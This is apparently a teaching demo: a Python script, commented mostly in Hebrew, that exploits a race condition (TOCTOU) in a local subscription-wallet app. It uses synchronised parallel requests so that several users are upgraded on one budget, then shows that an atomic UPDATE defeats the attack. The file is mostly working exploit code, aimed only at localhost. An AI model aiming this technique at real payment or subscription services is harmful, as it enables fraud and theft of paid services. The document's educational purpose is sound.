#!/usr/bin/env python3
"""
attack_tool.py - כלי התקיפה
============================
סקריפט שמדגים את מתקפת Race Condition.
שולח בקשות מקביליות לנקודת הקצה הפגיעה.

Attack tool demonstrating the Race Condition exploit.
Sends concurrent requests to the vulnerable endpoint.

Usage:
    python attack_tool.py           # מתקפה על נקודת קצה פגיעה
    python attack_tool.py --secure  # בדיקה מול נקודת קצה מאובטחת
    python attack_tool.py --reset   # איפוס המערכת
"""

import requests
import threading
import time
import argparse
from concurrent.futures import ThreadPoolExecutor, as_completed

# הגדרות
BASE_URL = "http://localhost:5000"
NUM_REQUESTS = 5  # מספר הבקשות המקביליות (כמספר המשתמשים)

# צבעים לטרמינל
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    END = '\033[0m'


def print_banner():
    """הדפסת באנר פתיחה"""
    banner = f"""
{Colors.RED}╔═══════════════════════════════════════════════════════════════════╗
║                                                                   ║
║   ⚔️  RACE CONDITION ATTACK TOOL  ⚔️                              ║
║                                                                   ║
║   TOCTOU Exploit - SaaS Premium Subscription Theft               ║
║                                                                   ║
╚═══════════════════════════════════════════════════════════════════╝{Colors.END}
"""
    print(banner)


def print_section(title):
    """הדפסת כותרת סקשן"""
    print(f"\n{Colors.CYAN}{'═' * 60}{Colors.END}")
    print(f"{Colors.BOLD}{Colors.CYAN}  {title}{Colors.END}")
    print(f"{Colors.CYAN}{'═' * 60}{Colors.END}\n")


def get_stats():
    """קבלת סטטיסטיקות מהשרת"""
    try:
        response = requests.get(f"{BASE_URL}/api/stats")
        return response.json()
    except requests.exceptions.ConnectionError:
        print(f"{Colors.RED}❌ שגיאה: לא ניתן להתחבר לשרת!{Colors.END}")
        print(f"{Colors.YELLOW}   וודא שהשרת רץ: python app.py{Colors.END}")
        return None


def print_stats(stats, title="מצב המערכת"):
    """הדפסת סטטיסטיקות"""
    if not stats:
        return
    
    print_section(title)
    
    # יתרה
    balance = stats['wallet']['balance']
    balance_color = Colors.RED if balance < 0 else (Colors.YELLOW if balance < 100 else Colors.GREEN)
    print(f"  💰 יתרת ארנק: {balance_color}${balance:.2f}{Colors.END}")
    
    # משתמשים
    print(f"  👥 משתמשים: {stats['stats']['free']} Free | {stats['stats']['premium']} Premium")
    
    # רשימת משתמשים
    print(f"\n  {Colors.BOLD}רשימת משתמשים:{Colors.END}")
    for user in stats['users']:
        status = f"{Colors.YELLOW}👑 Premium{Colors.END}" if user['is_premium'] else f"{Colors.BLUE}Free{Colors.END}"
        print(f"    • {user['name']} (ID: {user['id']}) - {status}")


def send_upgrade_request(user_id, secure=False):
    """
    שליחת בקשת שדרוג לשרת.
    
    Args:
        user_id: מזהה המשתמש לשדרוג
        secure: האם להשתמש בנקודת הקצה המאובטחת
    
    Returns:
        dict עם תוצאת הבקשה
    """
    endpoint = "/api/upgrade/secure" if secure else "/api/upgrade"
    url = f"{BASE_URL}{endpoint}"
    
    try:
        response = requests.post(
            url,
            json={"user_id": user_id},
            headers={"Content-Type": "application/json"}
        )
        return {
            "user_id": user_id,
            "status_code": response.status_code,
            "response": response.json()
        }
    except Exception as e:
        return {
            "user_id": user_id,
            "status_code": 0,
            "error": str(e)
        }


def reset_system():
    """איפוס המערכת"""
    print_section("🔄 מאפס את המערכת...")
    try:
        response = requests.post(f"{BASE_URL}/api/reset")
        if response.json().get('success'):
            print(f"  {Colors.GREEN}✅ המערכת אופסה בהצלחה!{Colors.END}")
            return True
    except Exception as e:
        print(f"  {Colors.RED}❌ שגיאה באיפוס: {e}{Colors.END}")
    return False


def launch_attack(secure=False):
    """
    הרצת המתקפה!
    
    שולחת NUM_REQUESTS בקשות במקביל לשרת.
    כל הבקשות נשלחות באותו רגע בדיוק.
    
    Args:
        secure: האם לתקוף את נקודת הקצה המאובטחת
    """
    endpoint_type = "מאובטחת 🟢" if secure else "פגיעה 🔴"
    print_section(f"⚔️ מתחיל מתקפה על נקודת קצה {endpoint_type}")
    
    print(f"  📤 שולח {NUM_REQUESTS} בקשות במקביל...")
    print(f"  ⏱️  כל הבקשות יישלחו באותו רגע בדיוק\n")
    
    # מנגנון סנכרון - כל ה-threads ימתינו לאות התחלה
    barrier = threading.Barrier(NUM_REQUESTS)
    results = []
    
    def attack_worker(user_id):
        """Worker function לכל thread"""
        # ממתין שכל ה-threads יהיו מוכנים
        barrier.wait()
        # שולח את הבקשה
        return send_upgrade_request(user_id, secure)
    
    # שימוש ב-ThreadPoolExecutor לשליחה מקבילית
    start_time = time.time()
    
    with ThreadPoolExecutor(max_workers=NUM_REQUESTS) as executor:
        # שולח את כל הבקשות
        futures = [executor.submit(attack_worker, i+1) for i in range(NUM_REQUESTS)]
        
        # אוסף תוצאות
        for future in as_completed(futures):
            results.append(future.result())
    
    elapsed_time = time.time() - start_time
    
    # הדפסת תוצאות
    print_section("📊 תוצאות המתקפה")
    
    success_count = 0
    for result in sorted(results, key=lambda x: x['user_id']):
        user_id = result['user_id']
        
        if 'error' in result:
            print(f"  ❌ משתמש {user_id}: שגיאה - {result['error']}")
        else:
            response = result['response']
            if response.get('success'):
                success_count += 1
                req_id = response.get('request_id', 'N/A')
                balance_before = response.get('balance_before', 'N/A')
                balance_after = response.get('balance_after', 'N/A')
                print(f"  {Colors.GREEN}✅ משתמש {user_id}: שודרג!{Colors.END}")
                print(f"     [{req_id}] יתרה: ${balance_before} → ${balance_after}")
            else:
                error = response.get('error', 'Unknown error')
                print(f"  {Colors.RED}⛔ משתמש {user_id}: נדחה - {error}{Colors.END}")
    
    # סיכום
    print(f"\n  {Colors.BOLD}סיכום:{Colors.END}")
    print(f"  • זמן ביצוע: {elapsed_time:.3f} שניות")
    print(f"  • בקשות שהצליחו: {success_count}/{NUM_REQUESTS}")
    
    if not secure and success_count > 1:
        print(f"\n  {Colors.RED}{Colors.BOLD}🚨 המתקפה הצליחה! 🚨{Colors.END}")
        print(f"  {Colors.RED}   {success_count} משתמשים שודרגו עם תקציב של משתמש אחד!{Colors.END}")
    elif secure and success_count <= 1:
        print(f"\n  {Colors.GREEN}{Colors.BOLD}🛡️ ההגנה עבדה! 🛡️{Colors.END}")
        print(f"  {Colors.GREEN}   רק משתמש אחד שודרג (כצפוי){Colors.END}")


def main():
    """פונקציה ראשית"""
    parser = argparse.ArgumentParser(description='Race Condition Attack Tool')
    parser.add_argument('--secure', action='store_true', 
                       help='תקיפה על נקודת הקצה המאובטחת')
    parser.add_argument('--reset', action='store_true',
                       help='איפוס המערכת בלבד')
    args = parser.parse_args()
    
    print_banner()
    
    # בדיקת חיבור לשרת
    stats = get_stats()
    if not stats:
        return
    
    # אם רק איפוס
    if args.reset:
        reset_system()
        stats = get_stats()
        print_stats(stats, "מצב לאחר איפוס")
        return
    
    # הצגת מצב לפני
    print_stats(stats, "📊 מצב לפני המתקפה")
    
    # בדיקה אם צריך לאפס
    if stats['stats']['premium'] > 0 or stats['wallet']['balance'] != 100:
        print(f"\n{Colors.YELLOW}⚠️  המערכת לא במצב התחלתי. מאפס...{Colors.END}")
        reset_system()
        time.sleep(0.5)
        stats = get_stats()
        print_stats(stats, "📊 מצב לאחר איפוס")
    
    # הרצת המתקפה (אוטומטית)
    print(f"\n{Colors.BOLD}🚀 מתחיל מתקפה...{Colors.END}")
    time.sleep(1)
    launch_attack(secure=args.secure)
    
    # הצגת מצב אחרי
    time.sleep(0.5)
    stats = get_stats()
    print_stats(stats, "📊 מצב לאחר המתקפה")
    
    # ניתוח סופי
    print_section("📝 ניתוח")
    
    balance = stats['wallet']['balance']
    premium_count = stats['stats']['premium']
    
    if not args.secure:
        if balance < 0:
            print(f"  {Colors.RED}🔴 חולשה הודגמה בהצלחה!{Colors.END}")
            print(f"  • היתרה ירדה ל-${balance} (שלילי!)")
            print(f"  • {premium_count} משתמשים שודרגו במקום 1")
            print(f"  • הפסד כספי: ${abs(balance)}")
            print(f"\n  {Colors.YELLOW}💡 הסיבה:{Colors.END}")
            print(f"     הבדיקה (Check) והעדכון (Act) לא היו אטומיים.")
            print(f"     כל הבקשות קראו את אותה יתרה ($100) לפני העדכון.")
        else:
            print(f"  המתקפה לא הצליחה במלואה (ייתכן שהשרת איטי)")
    else:
        if balance >= 0 and premium_count <= 1:
            print(f"  {Colors.GREEN}🟢 ההגנה עבדה!{Colors.END}")
            print(f"  • היתרה: ${balance} (לא שלילית)")
            print(f"  • רק {premium_count} משתמש שודרג")
            print(f"\n  {Colors.YELLOW}💡 למה זה עבד:{Colors.END}")
            print(f"     העדכון האטומי (UPDATE ... WHERE balance >= cost)")
            print(f"     מבטיח שהבדיקה והעדכון מתבצעים כפעולה אחת.")


if __name__ == "__main__":
    main()
